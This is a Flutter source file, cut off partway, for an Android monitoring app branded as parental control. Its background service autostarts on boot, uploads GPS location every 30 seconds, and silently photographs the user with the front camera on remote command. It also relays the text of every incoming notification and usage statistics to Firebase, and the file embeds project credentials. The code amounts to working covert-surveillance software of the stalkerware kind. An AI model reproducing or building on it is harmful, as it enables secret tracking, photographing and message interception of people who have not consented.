// ============================================================================
//  FlashGuard — Professional Parental Control App
//  main.dart  (v2.0 — complete single-file build)
// ----------------------------------------------------------------------------
//  ARCHITECTURE OVERVIEW
//  ─────────────────────
//  ① main()
//     • Initialises Flutter, Firebase, Anonymous Auth
//     • Requests every runtime permission
//     • Configures & starts the Android Foreground Service
//     • Launches the UI
//
//  ② _onServiceStart()  [separate Dart isolate — survives app close]
//     • GPS push   → Firebase  every 30 seconds
//     • Camera     → listens for commands/capture == true in Firebase,
//                    takes a hidden photo, uploads to Storage
//     • Notifications → relays each incoming notification to Firebase
//     • App Usage  → pushes 24-hour usage snapshot hourly
//
//  ③ UI (MyApp → DashboardPage → 3 tabs)
//     • Overview   — live status cards + remote capture button
//     • Location   — live GPS card with coordinates
//     • Activity   — bar chart + list of app usage
// ============================================================================

import 'dart:async';
import 'dart:io';
import 'dart:ui';

import 'package:app_usage/app_usage.dart';
import 'package:camera/camera.dart';
import 'package:firebase_auth/firebase_auth.dart';
import 'package:firebase_core/firebase_core.dart';
import 'package:firebase_database/firebase_database.dart';
import 'package:firebase_storage/firebase_storage.dart';
import 'package:fl_chart/fl_chart.dart';
import 'package:flutter/material.dart';
import 'package:flutter_background_service/flutter_background_service.dart';
import 'package:flutter_local_notifications/flutter_local_notifications.dart';
import 'package:geocoding/geocoding.dart';
import 'package:geolocator/geolocator.dart';
import 'package:google_fonts/google_fonts.dart';
import 'package:intl/intl.dart';
import 'package:notification_listener_service/notification_listener_service.dart';
import 'package:path_provider/path_provider.dart';
import 'package:permission_handler/permission_handler.dart';
import 'package:shared_preferences/shared_preferences.dart';
import 'package:uuid/uuid.dart';

// ═══════════════════════════════════════════════════════════════════════════════
//  FIREBASE CONFIG — FlashGuard project
// ═══════════════════════════════════════════════════════════════════════════════

const FirebaseOptions _kFirebaseOptions = FirebaseOptions(
  apiKey: 'AIzaSyBE8T-wOyXiBAHSRlmdyvhOlT7uCB-Lp1o',
  appId: '1:1026475439765:android:55df02c099239e8b4c4d9c',
  messagingSenderId: '1026475439765',
  projectId: 'flashguard-99c20',
  databaseURL: 'https://flashguard-99c20-default-rtdb.firebaseio.com',
  storageBucket: 'flashguard-99c20.appspot.com',
);

// ═══════════════════════════════════════════════════════════════════════════════
//  CONSTANTS
// ═══════════════════════════════════════════════════════════════════════════════

const _kNotifChannelId   = 'flashguard_fg';
const _kNotifChannelName = 'FlashGuard Monitoring';
const _kDeviceIdKey      = 'fg_device_id';
const _kGpsIntervalSec   = 30;   // push GPS every N seconds

// Dark-theme colour palette
const _kBg       = Color(0xFF080B14);
const _kSurface  = Color(0xFF111420);
const _kCard     = Color(0xFF181C2E);
const _kPrimary  = Color(0xFF7B6FFF);
const _kGreen    = Color(0xFF00E5A0);
const _kRed      = Color(0xFFFF4F6B);
const _kAmber    = Color(0xFFFFB830);

// ═══════════════════════════════════════════════════════════════════════════════
//  ENTRY POINT
// ═══════════════════════════════════════════════════════════════════════════════

Future<void> main() async {
  WidgetsFlutterBinding.ensureInitialized();

  // 1. Firebase
  await Firebase.initializeApp(options: _kFirebaseOptions);

  // 2. Anonymous auth — replace with email/Google auth if needed
  if (FirebaseAuth.instance.currentUser == null) {
    await FirebaseAuth.instance.signInAnonymously();
  }

  // 3. Runtime permissions
  await _requestAllPermissions();

  // 4. Android foreground service
  await _initBackgroundService();

  runApp(const FlashGuardApp());
}

// ─── Permission helper ───────────────────────────────────────────────────────

Future<void> _requestAllPermissions() async {
  // Standard runtime permissions
  await [
    Permission.location,
    Permission.locationAlways,   // "Allow all the time" — needed for bg GPS
    Permission.camera,
    Permission.notification,
    Permission.ignoreBatteryOptimizations,
  ].request();

  // Usage-stats is a special permission — must be granted manually in Settings.
  // We open the settings screen once; the user taps "FlashGuard → toggle on".
  final usageGranted = await Permission.activityRecognition.isGranted;
  if (!usageGranted) {
    await openAppSettings(); // directs to Special App Access → Usage access
  }

  // Notification Listener permission — also a special access setting.
  final notiGranted =
      await NotificationListenerService.isPermissionGranted();
  if (!(notiGranted ?? false)) {
    await NotificationListenerService.requestPermission();
  }
}

// ═══════════════════════════════════════════════════════════════════════════════
//  BACKGROUND SERVICE SETUP
// ═══════════════════════════════════════════════════════════════════════════════

Future<void> _initBackgroundService() async {
  final service = FlutterBackgroundService();

  // Create the notification channel for the persistent notification
  final notifPlugin = FlutterLocalNotificationsPlugin();
  await notifPlugin
      .resolvePlatformSpecificImplementation<
          AndroidFlutterLocalNotificationsPlugin>()
      ?.createNotificationChannel(
        const AndroidNotificationChannel(
          _kNotifChannelId,
          _kNotifChannelName,
          description: 'FlashGuard is actively monitoring this device.',
          importance: Importance.low,
          playSound: false,
          enableVibration: false,
        ),
      );

  await service.configure(
    // ── Android config ──────────────────────────────────────────────────────
    androidConfiguration: AndroidConfiguration(
      onStart: _onServiceStart,         // isolate entry — defined below
      isForegroundMode: true,
      autoStart: true,
      autoStartOnBoot: true,            // restarts after device reboot
      notificationChannelId: _kNotifChannelId,
      initialNotificationTitle: 'FlashGuard',
      initialNotificationContent: 'Monitoring is active…',
      foregroundServiceNotificationId: 9001,
      // foregroundServiceTypes declared in AndroidManifest — location | camera
    ),
    // ── iOS config (basic keep-alive) ────────────────────────────────────────
    iosConfiguration: IosConfiguration(
      autoStart: true,
      onForeground: _onServiceStart,
      onBackground: _iosBackground,
    ),
  );

  service.startService();
}

@pragma('vm:entry-point')
Future<bool> _iosBackground(ServiceInstance service) async {
  DartPluginRegistrant.ensureInitialized();
  return true;
}

// ═══════════════════════════════════════════════════════════════════════════════
//  BACKGROUND SERVICE — MAIN LOOP  (separate isolate)
// ═══════════════════════════════════════════════════════════════════════════════

@pragma('vm:entry-point')
void _onServiceStart(ServiceInstance service) async {
  // Essential: register plugins for the background isolate
  DartPluginRegistrant.ensureInitialized();

  // Re-initialise Firebase inside the isolate
  await Firebase.initializeApp(options: _kFirebaseOptions);

  // Retrieve or generate a stable device ID
  final prefs   = await SharedPreferences.getInstance();
  final deviceId = prefs.getString(_kDeviceIdKey) ?? const Uuid().v4();
  await prefs.setString(_kDeviceIdKey, deviceId);

  final deviceRef = FirebaseDatabase.instance.ref('devices/$deviceId');

  // Mark the device as online
  await deviceRef.child('meta').update({
    'online'    : true,
    'startedAt' : DateTime.now().millisecondsSinceEpoch,
  });

  // ── ① GPS: push every 30 seconds ──────────────────────────────────────────
  Timer.periodic(const Duration(seconds: _kGpsIntervalSec), (_) async {
    await _pushLocation(deviceRef);
  });
  // Also push immediately on start
  await _pushLocation(deviceRef);

  // ── ② Camera trigger listener ──────────────────────────────────────────────
  // Parent dashboard sets commands/capture = true  →  this fires
  deviceRef.child('commands/capture').onValue.listen((event) async {
    if (event.snapshot.value == true) {
      // Reset the flag first so it can be triggered again
      await deviceRef.child('commands/capture').set(false);
      await _captureAndUpload(deviceRef, deviceId);
    }
  });

  // ── ③ Notification relay ───────────────────────────────────────────────────
  NotificationListenerService.notificationsStream.listen((event) {
    deviceRef.child('notifications').push().set({
      'package'   : event.packageName ?? 'unknown',
      'title'     : event.title ?? '',
      'body'      : event.content ?? '',
      'timestamp' : DateTime.now().millisecondsSinceEpoch,
    });
  });

  // ── ④ App usage: push once now, then every hour ───────────────────────────
  await _pushAppUsage(deviceRef);
  Timer.periodic(const Duration(hours: 1), (_) => _pushAppUsage(deviceRef));

  // ── ⑤ Keep the foreground notification clock updated ─────────────────────
  if (service is AndroidServiceInstance) {
    Timer.periodic(const Duration(minutes: 1), (_) {
      service.setForegroundNotificationInfo(
        title   : 'FlashGuard — Active',
        content : 'Monitoring · ${DateFormat.Hm().format(DateTime.now())}',
      );
    });
  }
}

// ─────────────────────────────────────────────────────────────────────────────
//  Helper: push GPS location to Firebase
// ─────────────────────────────────────────────────────────────────────────────

Future<void> _pushLocation(DatabaseReference deviceRef) async {
  try {
    final position = await Geolocator.getCurrentPosition(
      locationSettings: const LocationSettings(
        accuracy : LocationAccuracy.high,
        timeLimit: Duration(seconds: 12),
      ),
    );

    // Reverse-geocode to get a human-readable address
    String address = '';
    try {
      final placemarks = await placemarkFromCoordinates(
          position.latitude, position.longitude);
      if (placemarks.isNotEmpty) {
        final p = placemarks.first;
        address =
            '${p.street ?? ''}, ${p.locality ?? ''}, ${p.country ?? ''}'
                .trim()
                .replaceAll(RegExp(r'^,\s*'), '');
      }
    } catch (_) {}

    await deviceRef.child('location').set({
      'lat'      : position.latitude,
      'lng'      : position.longitude,
      'accuracy' : position.accuracy,
      'speed'    : position.speed,           // m/s
      'address'  : address,
      'timestamp': DateTime.now().millisecondsSinceEpoch,
    });
  } catch (_) {
    // GPS unavailable (airplane mode, denied, timeout) — skip silently
  }
}

// ─────────────────────────────────────────────────────────────────────────────
//  Helper: take hidden photo and upload to Firebase Storage
// ─────────────────────────────────────────────────────────────────────────────

Future<void> _captureAndUpload(
    DatabaseReference deviceRef, String deviceId) async {
  CameraController? controller;
  try {
    final cameras = await availableCameras();
    if (cameras.isEmpty) return;

    // Front camera preferred for face capture; fall back to rear
    final camera = cameras.firstWhere(
      (c) => c.lensDirection == CameraLensDirection.front,
      orElse: () => cameras.first,
    );

    controller = CameraController(
      camera,
      ResolutionPreset.medium,
      enableAudio: false,
      imageFormatGroup: ImageFormatGroup.jpeg,
    );

    await controller.initialize();
    // Small delay so the sensor has time to adjust exposure
    await Future.delayed(const Duration(milliseconds: 400));

    final xFile = await controller.takePicture();
    await controller.dispose();
    controller = null;

    // Upload to Storage  →  devices/<id>/captures/<timestamp>.jpg
    final ts           = DateTime.now().millisecondsSinceEpoch;
    final storageRef   = FirebaseStorage.instance
        .ref('devices/$deviceId/captures/$ts.jpg');
    final uploadTask   = storageRef.putFile(
      File(xFile.path),
      SettableMetadata(contentType: 'image/jpeg'),
    );
    final snapshot    = await uploadTask;
    final downloadUrl = await snapshot.ref.getDownloadURL();

    // Save URL + metadata to Realtime Database
    await deviceRef.child('captures').push().set({
      'url'      : downloadUrl,
      'timestamp': ts,
      'camera'   : camera.lensDirection.name,
    });
  } catch (_) {
    controller?.dispose();
  }
}

// ─────────────────────────────────────────────────────────────────────────────
//  Helper: push app usage stats (last 24 hours)
// ─────────────────────────────────────────────────────────────────────────────

Future<void> _pushAppUsage(DatabaseReference deviceRef) async {
  try {
    final now   = DateTime.now();
    final since = now.subtract(const Duration(hours: 24));
    final usage = await AppUsage().getAppUsage(since, now);

    final Map<String, dynamic> payload = {};
    for (final info in usage) {
      if (info.usage.inSeconds > 0) {
        // Firestore keys cannot contain '.' — replace with '_'
        final key = info.packageName.replaceAll('.', '_');
        payload[key] = {
          'name'   : info.appName,
          'seconds': info.usage.inSeconds,
        };
      }
    }

    await deviceRef.child('appUsage').set({
      'data'      : payload,
      'updatedAt' : now.millisecondsSinceEpoch,
    });
  } catch (_) {}
}

// ═══════════════════════════════════════════════════════════════════════════════
//  UI — FlashGuardApp (root widget)
// ═══════════════════════════════════════════════════════════════════════════════

class FlashGuardApp extends StatelessWidget {
  const FlashGuardApp({super.key});

  @override
  Widget build(BuildContext context) {
    return MaterialApp(
      title: 'FlashGuard',
      debugShowCheckedModeBanner: false,
      theme: _buildTheme(),
      home: const DashboardPage(),
    );
  }

  ThemeData _buildTheme() {
    return ThemeData(
      brightness: Brightness.dark,
      scaffoldBackgroundColor: _kBg,
      colorScheme: const ColorScheme.dark(
        primary   : _kPrimary,
        secondary : _kGreen,
        surface   : _kSurface,
        background: _kBg,
      ),
      cardColor: _kCard,
      textTheme: GoogleFonts.interTextTheme(ThemeData.dark().textTheme),
      appBarTheme: AppBarTheme(
        backgroundColor  : _kBg,
        elevation        : 0,
        scrolledUnderElevation: 0,
        centerTitle      : false,
        titleTextStyle   : GoogleFonts.inter(
          fontSize  : 20,
          fontWeight: FontWeight.w700,
          color     : Colors.white,
        ),
      ),
      useMaterial3: true,
    );
  }
}

// ═══════════════════════════════════════════════════════════════════════════════
//  DASHBOARD PAGE
// ═══════════════════════════════════════════════════════════════════════════════

class DashboardPage extends StatefulWidget {
  const DashboardPage({super.key});

  @override
  State<DashboardPage> createState() => _DashboardPageState();
}

class _DashboardPageState extends State<DashboardPage>
    with SingleTickerProviderStateMixin {
  late final TabController _tabs;
  String _deviceId    = '';
  bool   _svcRunning  = false;

  @override
  void initState() {
    super.initState();
    _tabs = TabController(length: 3, vsync: this);
    _bootstrap();
  }

  Future<void> _bootstrap() async {
    final prefs = await SharedPreferences.getInstance();
    final id    = prefs.getString(_kDeviceIdKey) ?? '';
    final svc   = await FlutterBackgroundService().isRunning();
    if (mounted) setState(() { _deviceId = id; _svcRunning = svc; });
  }

  @override
  void dispose() { _tabs.dispose(); super.dispose(); }

  @override
  Widget build(BuildContext context) {
    return Scaffold(
      appBar: AppBar(
        leading: Padding(
          padding: const EdgeInsets.all(10),
          child: ShaderMask(
            shaderCallback: (r) => const LinearGradient(
              colors: [_kPrimary, _kGreen],
            ).createShader(r),
            child: const Icon(Icons.shield_rounded, size: 28, color: Colors.white),
          ),
        ),
        title: const Text('FlashGuard'),
        actions: [
          _LiveBadge(running: _svcRunning),
          const SizedBox(width: 14),
        ],
        bottom: TabBar(
          controller      : _tabs,
          indicatorColor  : _kPrimary,
          indicatorWeight : 3,
          labelColor      : _kPrimary,
          unselectedLabelColor: Colors.white30,
          labelStyle      : GoogleFonts.inter(fontWeight: FontWeight.w600, fontSize: 13),
          tabs: const [
            Tab(text: 'Overview'),
            Tab(text: 'Location'),
            Tab(text: 'Activity'),
          ],
        ),
      ),
      body: _deviceId.isEmpty
          ? const Center(child: CircularProgressIndicator())
          : TabBarView(
              controller: _tabs,
              children: [
                _OverviewTab(deviceId: _deviceId),
                _LocationTab(deviceId: _deviceId),
                _ActivityTab(deviceId: _deviceId),
              ],
            ),
    );
  }
}

// ─── Animated LIVE badge ──────────────────────────────────────────────────────

class _LiveBadge extends StatefulWidget {
  const _LiveBadge({required this.running});
  final bool running;

  @override
  State<_LiveBadge> createState() => _LiveBadgeState();
}

class _LiveBadgeState extends State<_LiveBadge>
    with SingleTickerProviderStateMixin {
  late final AnimationController _ctrl;

  @override
  void initState() {
    super.initState();
    _ctrl = AnimationController(
        vsync: this, duration: const Duration(milliseconds: 900))
      ..repeat(reverse: true);
  }

  @override
  void dispose() { _ctrl.dispose(); super.dispose(); }

  @override
  Widget build(BuildContext context) {
    final color = widget.running ? _kGreen : _kRed;
    return Container(
      padding: const EdgeInsets.symmetric(horizontal: 10, vertical: 5),
      decoration: BoxDecoration(
        color       : color.withOpacity(0.12),
        borderRadius: BorderRadius.circular(20),
        border      : Border.all(color: color.withOpacity(0.6), width: 1),
      ),
      child: Row(
        mainAxisSize: MainAxisSize.min,
        children: [
          FadeTransition(
            opacity: _ctrl,
            child: Container(
              width: 7, height: 7,
              decoration: BoxDecoration(color: color, shape: BoxShape.circle),
            ),
          ),
          const SizedBox(width: 6),
          Text(
            widget.running ? 'LIVE' : 'OFFLINE',
            style: TextStyle(
              color     : color,
              fontSize  : 10,
              fontWeight: FontWeight.w800,
              letterSpacing: 1.4,
            ),
          ),
        ],
      ),
    );
  }
}

// ═══════════════════════════════════════════════════════════════════════════════
//  TAB 1 — OVERVIEW
// ═══════════════════════════════════════════════════════════════════════════════

class _OverviewTab extends StatelessWidget {
  const _OverviewTab({required this.deviceId});
  final String deviceId;

  @override
  Widget build(BuildContext context) {
    final ref = FirebaseDatabase.instance.ref('devices/$deviceId');

    return ListView(
      padding: const EdgeInsets.fromLTRB(16, 20, 16, 30),
      children: [

        // ── Section: System Status ───────────────────────────────────────────
        _SectionLabel('System Status'),
        const SizedBox(height: 12),
        Row(
          children: [
            Expanded(
              child: _FirebaseStatCard(
                stream: ref.child('location/timestamp').onValue,
                label : 'GPS Tracking',
                icon  : Icons.gps_fixed_rounded,
                color : _kGreen,
                valueBuilder: (snap) =>
                    snap.value != null ? 'Active' : 'No Fix',
              ),
            ),
            const SizedBox(width: 12),
            Expanded(
              child: _FirebaseStatCard(
                stream: ref.child('appUsage/updatedAt').onValue,
                label : 'Usage Stats',
                icon  : Icons.bar_chart_rounded,
                color : _kPrimary,
                valueBuilder: (snap) =>
                    snap.value != null ? 'Synced' : 'Pending',
              ),
            ),
          ],
        ),
        const SizedBox(height: 12),
        Row(
          children: [
            Expanded(
              child: _FirebaseStatCard(
                stream: ref.child('captures').limitToLast(1).onValue,
                label : 'Camera',
                icon  : Icons.camera_alt_rounded,
                color : _kRed,
                valueBuilder: (snap) =>
                    snap.value != null ? 'Ready' : 'Idle',
              ),
            ),
            const SizedBox(width: 12),
            Expanded(
              child: _FirebaseStatCard(
                stream: ref.child('notifications').limitToLast(1).onValue,
                label : 'Notifications',
                icon  : Icons.notifications_active_rounded,
                color : _kAmber,
                valueBuilder: (snap) =>
                    snap.value != null ? 'Listening' : 'Idle',
              ),
            ),
          ],
        ),

        const SizedBox(height: 28),

        // ── Section: Active Monitoring ───────────────────────────────────────
        _SectionLabel('Active Monitoring'),
        const SizedBox(height: 12),
        _MonitoringCard(deviceRef: ref),

        const SizedBox(height: 28),

        // ── Section: Remote Camera ───────────────────────────────────────────
        _SectionLabel('Remote Camera Trigger'),
        const SizedBox(height: 12),
        _CameraTriggerCard(deviceId: deviceId),

        const SizedBox(height: 28),

        // ── Section: Recent Captures ─────────────────────────────────────────
        _SectionLabel('Recent Captures'),
        const SizedBox(height: 12),
        _CapturesList(deviceRef: ref),

        const SizedBox(height: 28),

        // ── Section: Recent Notifications ────────────────────────────────────
        _SectionLabel('Recent Notifications'),
        const SizedBox(height: 12),
        _NotificationsList(deviceRef: ref),
      ],
    );
  }
}

// ─── Firebase-stream stat card ────────────────────────────────────────────────

class _FirebaseStatCard extends StatelessWidget {
  const _FirebaseStatCard({
    required this.stream,
    required this.label,
    required this.icon,
    required this.color,
    required this.valueBuilder,
  });

  final Stream<DatabaseEvent> stream;
  final String label;
  final IconData icon;
  final Color color;
  final String Function(DataSnapshot) valueBuilder;

  @override
  Widget build(BuildContext context) {
    return StreamBuilder<DatabaseEvent>(
      stream: stream,
      builder: (context, snap) {
        final value = snap.hasData
            ? valueBuilder(snap.data!.snapshot)
            : '…';

        return Container(
          padding     : const EdgeInsets.all(16),
          decoration  : BoxDecoration(
            color       : _kCard,
            borderRadius: BorderRadius.circular(16),
            border      : Border.all(color: color.withOpacity(0.22), width: 1),
          ),
          child: Column(
            crossAxisAlignment: CrossAxisAlignment.start,
            children: [
              Container(
                padding    : const EdgeInsets.all(8),
                decoration : BoxDecoration(
                  color       : color.withOpacity(0.14),
                  borderRadius: BorderRadius.circular(10),
                ),
                child: Icon(icon, color: color, size: 18),
              ),
              const SizedBox(height: 12),
              Text(
                value,
                style: TextStyle(
                  color     : color,
                  fontSize  : 15,
                  fontWeight: FontWeight.w700,
                ),
              ),
              const SizedBox(height: 3),
              Text(label,
                  style: const TextStyle(color: Colors.white38, fontSize: 11)),
            ],
          ),
        );
      },
    );
  }
}

// ─── Active monitoring strip ──────────────────────────────────────────────────

class _MonitoringCard extends StatelessWidget {
  const _MonitoringCard({required this.deviceRef});
  final DatabaseReference deviceRef;

  @override
  Widget build(BuildContext context) {
    return StreamBuilder<DatabaseEvent>(
      stream: deviceRef.child('location').onValue,
      builder: (context, snap) {
        String gpsLabel = 'Waiting for GPS…';
        if (snap.hasData && snap.data!.snapshot.value != null) {
          final loc = Map<String, dynamic>.from(
              snap.data!.snapshot.value as Map);
          final ts = loc['timestamp'] as int? ?? 0;
          final time = DateFormat('HH:mm:ss')
              .format(DateTime.fromMillisecondsSinceEpoch(ts));
          gpsLabel = 'Last ping at $time';
        }

        return Container(
          padding    : const EdgeInsets.all(18),
          decoration : BoxDecoration(
            gradient   : const LinearGradient(
              colors: [Color(0xFF1A1040), Color(0xFF0E2235)],
            ),
            borderRadius: BorderRadius.circular(18),
            border: Border.all(color: _kPrimary.withOpacity(0.2), width: 1),
          ),
          child: Column(
            children: [
              _MonitorRow(
                icon   : Icons.gps_fixed_rounded,
                color  : _kGreen,
                title  : 'Live Location',
                subtitle: gpsLabel,
              ),
              const Divider(color: Colors.white10, height: 22),
              _MonitorRow(
                icon   : Icons.camera_alt_rounded,
                color  : _kRed,
                title  : 'Background Camera',
                subtitle: 'Listening for remote trigger',
              ),
              const Divider(color: Colors.white10, height: 22),
              _MonitorRow(
                icon   : Icons.bar_chart_rounded,
                color  : _kPrimary,
                title  : 'App Usage Stats',
                subtitle: 'Syncs every hour',
              ),
              const Divider(color: Colors.white10, height: 22),
              _MonitorRow(
                icon   : Icons.notifications_rounded,
                color  : _kAmber,
                title  : 'Notification Listener',
                subtitle: 'Capturing all incoming alerts',
              ),
            ],
          ),
        );
      },
    );
  }
}

class _MonitorRow extends StatelessWidget {
  const _MonitorRow({
    required this.icon,
    required this.color,
    required this.title,
    required this.subtitle,
  });

  final IconData icon;
  final Color    color;
  final String   title;
  final String   subtitle;

  @override
  Widget build(BuildContext context) {
    return Row(
      children: [
        Container(
          padding    : const EdgeInsets.all(7),
          decoration : BoxDecoration(
            color       : color.withOpacity(0.15),
            borderRadius: BorderRadius.circular(8),
          ),
          child: Icon(icon, color: color, size: 16),
        ),
        const SizedBox(width: 12),
        Expanded(
          child: Column(
            crossAxisAlignment: CrossAxisAlignment.start,
            children: [
              Text(title,
                  style: const TextStyle(
                      fontSize: 13, fontWeight: FontWeight.w600,
                      color: Colors.white)),
              const SizedBox(height: 2),
              Text(subtitle,
                  style: const TextStyle(
                      fontSize: 11, color: Colors.white38)),
            ],
          ),
        ),
        Container(
          width: 8, height: 8,
          decoration: BoxDecoration(color: color, shape: BoxShape.circle),
        ),
      ],
    );
  }
}

// ─── Remote camera trigger card ───────────────────────────────────────────────

class _CameraTriggerCard extends StatefulWidget {
  const _CameraTriggerCard({required this.deviceId});
  final String deviceId;

  @override
  State<_CameraTriggerCard> createState() => _CameraTriggerCardState();
}

class _CameraTriggerCardState extends State<_CameraTriggerCard> {
  bool _busy = false;

  Future<void> _trigger() async {
    setState(() => _busy = true);
    await FirebaseDatabase.instance
        .ref('devices/${widget.deviceId}/commands/capture')
        .set(true);
    if (mounted) {
      setState(() => _busy = false);
      ScaffoldMessenger.of(context).showSnackBar(
        const SnackBar(
          content          : Text('📸  Capture command sent to device'),
          backgroundColor  : Color(0xFF1E1E30),
          behavior         : SnackBarBehavior.floating,
          duration         : Duration(seconds: 2),
        ),
      );
    }
  }

  @override
  Widget build(BuildContext context) {
    return Container(
      padding    : const EdgeInsets.symmetric(horizontal: 18, vertical: 16),
      decoration : BoxDecoration(
        color       : _kCard,
        borderRadius: BorderRadius.circular(18),
        border      : Border.all(color: _kRed.withOpacity(0.25), width: 1),
      ),
      child: Row(
        children: [
          Container(
            padding    : const EdgeInsets.all(10),
            decoration : BoxDecoration(
              color       : _kRed.withOpacity(0.14),
              borderRadius: BorderRadius.circular(12),
            ),
            child: const Icon(Icons.camera_alt_rounded, color: _kRed, size: 24),
          ),
          const SizedBox(width: 14),
          Expanded(
            child: Column(
              crossAxisAlignment: CrossAxisAlignment.start,
              children: const [
                Text('Silent Remote Capture',
                    style: TextStyle(
                        fontWeight: FontWeight.w700, fontSize: 14,
                        color: Colors.white)),
                SizedBox(height: 3),
                Text('Triggers front camera silently on device',
                    style: TextStyle(color: Colors.white38, fontSize: 11)),
              ],
            ),
          ),
          const SizedBox(width: 10),
          _busy
              ? const SizedBox(
                  width: 28, height: 28,
                  child: CircularProgressIndicator(
                      strokeWidth: 2.5, color: _kRed))
              : GestureDetector(
                  onTap: _trigger,
                  child: Container(
                    padding: const EdgeInsets.symmetric(
                        horizontal: 16, vertical: 10),
                    decoration: BoxDecoration(
                      gradient    : const LinearGradient(
                          colors: [_kRed, Color(0xFFFF7B6B)]),
                      borderRadius: BorderRadius.circular(10),
                    ),
                    child: const Text('Capture',
                        style: TextStyle(
                            color     : Colors.white,
                            fontWeight: FontWeight.w700,
                            fontSize  : 13)),
                  ),
                ),
        ],
      ),
    );
  }
}

// ─── Recent Captures list ─────────────────────────────────────────────────────

class _CapturesList extends StatelessWidget {
  const _CapturesList({required this.deviceRef});
  final DatabaseReference deviceRef;

  @override
  Widget build(BuildContext context) {
    return StreamBuilder<DatabaseEvent>(
      stream: deviceRef.child('captures').limitToLast(5).onValue,
      builder: (context, snap) {
        if (!snap.hasData || snap.data!.snapshot.value == null) {
          return _EmptyCard(
              icon: Icons.no_photography_rounded,
              message: 'No captures yet.\nSend a remote trigger above.');
        }

        final raw = Map<String, dynamic>.from(snap.data!.snapshot.value as Map);
        final items = raw.values
            .map((e) => Map<String, dynamic>.from(e as Map))
            .toList()
          ..sort((a, b) =>
              (b['timestamp'] as int).compareTo(a['timestamp'] as int));

        return Container(
          decoration: BoxDecoration(
            color: _kCard, borderRadius: BorderRadius.circular(16)),
          child: Column(
            children: items.asMap().entries.map((entry) {
              final i   = entry.key;
              final cap = entry.value;
              final ts  = cap['timestamp'] as int? ?? 0;
              final time = DateFormat('dd MMM · HH:mm')
                  .format(DateTime.fromMillisecondsSinceEpoch(ts));
              return Column(
                children: [
                  ListTile(
                    leading: Container(
                      padding    : const EdgeInsets.all(8),
                      decoration : BoxDecoration(
                        color       : _kRed.withOpacity(0.12),
                        borderRadius: BorderRadius.circular(8),
                      ),
                      child: const Icon(Icons.image_rounded,
                          color: _kRed, size: 18),
                    ),
                    title   : Text('Capture ${items.length - i}',
                        style: const TextStyle(
                            fontWeight: FontWeight.w600, fontSize: 13)),
                    subtitle: Text(time,
                        style: const TextStyle(
                            color: Colors.white38, fontSize: 11)),
                    trailing: const Icon(Icons.open_in_new_rounded,
                        color: Colors.white24, size: 16),
                  ),
                  if (i < items.length - 1)
                    const Divider(
                        color: Colors.white10, height: 1, indent: 58),
                ],
              );
            }).toList(),
          ),
        );
      },
    );
  }
}

// ─── Recent Notifications list ────────────────────────────────────────────────

class _NotificationsList extends StatelessWidget {
  const _NotificationsList({required this.deviceRef});
  final DatabaseReference deviceRef;

  @override
  Widget build(BuildContext context) {
    return StreamBuilder<DatabaseEvent>(
      stream: deviceRef.child('notifications').limitToLast(8).onValue,
      builder: (context, snap) {
        if (!snap.hasData || snap.data!.snapshot.value == null) {
          return _EmptyCard(
              icon: Icons.notifications_off_rounded,
              message: 'No notifications captured yet.');
        }

        final raw = Map<String, dynamic>.from(snap.data!.snapshot.value as Map);
        final items = raw.values
            .map((e) => Map<String, dynamic>.from(e as Map))
            .toList()
          ..sort((a, b) =>
              (b['timestamp'] as int).compareTo(a['timestamp'] as int));

        return Container(
          decoration: BoxDecoration(
            color: _kCard, borderRadius: BorderRadius.circular(16)),
          child: Column(
            children: items.asMap().entries.map((entry) {
              final i    = entry.key;
              final notif = entry.value;
              final ts   = notif['timestamp'] as int? ?? 0;
              final time = DateFormat.Hm()
                  .format(DateTime.fromMillisecondsSinceEpoch(ts));
              return Column(
                children: [
                  ListTile(
                    leading: Container(
                      padding    : const EdgeInsets.all(8),
                      decoration : BoxDecoration(
                        color       : _kAmber.withOpacity(0.12),
                        borderRadius: BorderRadius.circular(8),
                      ),
                      child: const Icon(Icons.notifications_rounded,
                          color: _kAmber, size: 18),
                    ),
                    title: Text(
                      notif['title']?.isNotEmpty == true
                          ? notif['title'] as String
                          : notif['package'] as String? ?? 'App',
                      style: const TextStyle(
                          fontWeight: FontWeight.w600, fontSize: 13),
                    ),
                    subtitle: Text(
                      notif['body'] as String? ?? '',
                      maxLines       : 1,
                      overflow       : TextOverflow.ellipsis,
                      style: const TextStyle(
                          color: Colors.white38, fontSize: 11),
                    ),
                    trailing: Text(time,
                        style: const TextStyle(
                            color: Colors.white30, fontSize: 11)),
                  ),
                  if (i < items.length - 1)
                    const Divider(
                        color: Colors.white10, height: 1, indent: 58),
                ],
              );
            }).toList(),
          ),
        );
      },
    );
  }
}

// ═══════════════════════════════════════════════════════════════════════════════
//  TAB 2 — LOCATION
// ═══════════════════════════════════════════════════════════════════════════════

class _LocationTab extends StatelessWidget {
  const _LocationTab({required this.deviceId});
  final String deviceId;

  @override
  Widget build(BuildContext context) {
    final locRef =
        FirebaseDatabase.instance.ref('devices/$deviceId/location');

    return StreamBuilder<DatabaseEvent>(
      stream: locRef.onValue,
      builder: (context, snap) {
        if (!snap.hasData) {
          return const Center(child: CircularProgressIndicator());
        }
        if (snap.data!.snapshot.value == null) {
          return _EmptyCard(
              icon   : Icons.location_off_rounded,
              message: 'Waiting for first GPS fix…\nMake sure location is Always allowed.');
        }

        final loc = Map<String, dynamic>.from(snap.data!.snapshot.value as Map);
        final lat  = (loc['lat']      as num).toDouble();
        final lng  = (loc['lng']      as num).toDouble();
        final acc  = (loc['accuracy'] as num?)?.toDouble() ?? 0.0;
        final spd  = (loc['speed']    as num?)?.toDouble() ?? 0.0;
        final addr = loc['address']   as String? ?? '';
        final ts   = loc['timestamp'] as int?   ?? 0;
        final time = DateFormat('dd MMM yyyy · HH:mm:ss')
            .format(DateTime.fromMillisecondsSinceEpoch(ts));

        return ListView(
          padding: const EdgeInsets.fromLTRB(16, 20, 16, 30),
          children: [

            // Map placeholder — drop in google_maps_flutter here
            Container(
              height    : 220,
              decoration: BoxDecoration(
                color       : _kCard,
                borderRadius: BorderRadius.circular(20),
                border: Border.all(color: _kPrimary.withOpacity(0.25), width: 1),
              ),
              child: Stack(
                alignment: Alignment.center,
                children: [
                  const Icon(Icons.map_rounded,
                      color: Colors.white10, size: 80),
                  Column(
                    mainAxisSize: MainAxisSize.min,
                    children: [
                      const Icon(Icons.location_pin,
                          color: _kRed, size: 38),
                      const SizedBox(height: 6),
                      Text(
                        '${lat.toStringAsFixed(5)}, ${lng.toStringAsFixed(5)}',
                        style: const TextStyle(
                            color     : Colors.white70,
                            fontSize  : 13,
                            fontWeight: FontWeight.w600),
                      ),
                      if (addr.isNotEmpty) ...[
